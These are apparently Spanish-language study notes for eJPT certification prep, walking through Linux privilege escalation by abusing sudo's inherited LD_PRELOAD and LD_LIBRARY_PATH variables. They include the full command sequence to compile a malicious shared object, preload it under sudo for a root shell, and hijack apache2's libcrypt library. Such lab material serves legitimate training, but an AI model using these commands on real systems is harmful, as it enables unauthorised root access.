- Sudo se puede configurar para heredar ciertas variables de entorno del entorno del -usuario.
- Compruebe qué variables de entorno se heredan (busque las opciones env_keep):

```
sudo -l
```


![[Apuntes/Imagenes/Pasted image 20240322230125.png]]

- LD_PRELOAD y LD_LIBRARY_PATH se heredan del entorno del usuario. LD_PRELOAD carga un objeto compartido antes que cualquier otro cuando se ejecuta un programa. LD_LIBRARY_PATH proporciona una lista de directorios donde se buscan primero las bibliotecas compartidas.
 
- Cree un objeto compartido usando el código ubicado en /home/user/tools/sudo/preload.c:

```
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
```

- Ejecute uno de los programas que puede ejecutar mediante sudo (que aparecen al ejecutar sudo -l), mientras configura la variable de entorno LD_PRELOAD en la ruta completa del nuevo objeto compartido:

```
sudo LD_PRELOAD=/tmp/preload.so program-name-here
```

- Debería generarse un shell root. Sal del caparazón antes de continuar. Dependiendo del programa que elijas, es posible que también tengas que salir de este. 

- Ejecute ldd en el archivo de programa apache2 para ver qué bibliotecas compartidas utiliza el programa:

```
ldd /usr/sbin/apache2
```

- Cree un objeto compartido con el mismo nombre que una de las bibliotecas enumeradas (libcrypt.so.1) usando el código ubicado en /home/user/tools/sudo/library_path.c:

```
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
```

- Ejecute apache2 usando sudo, mientras configura la variable de entorno LD_LIBRARY_PATH en /tmp (donde generamos el objeto compartido compilado):

```
sudo LD_LIBRARY_PATH=/tmp apache2
```

![[Apuntes/Imagenes/Pasted image 20240323000043.png]]


enlace:
[[Local/Ciberseguridad/HACKING/CERTIFICACIONES/EJPT/Preparacion-Ejpt]]
[[Apuntes/Ciberseguridad/HACKING/TECNICAS DE ESCALACION DE PRIVILEGIOS/Linux/Sudo - Shell Escape Sequences]]
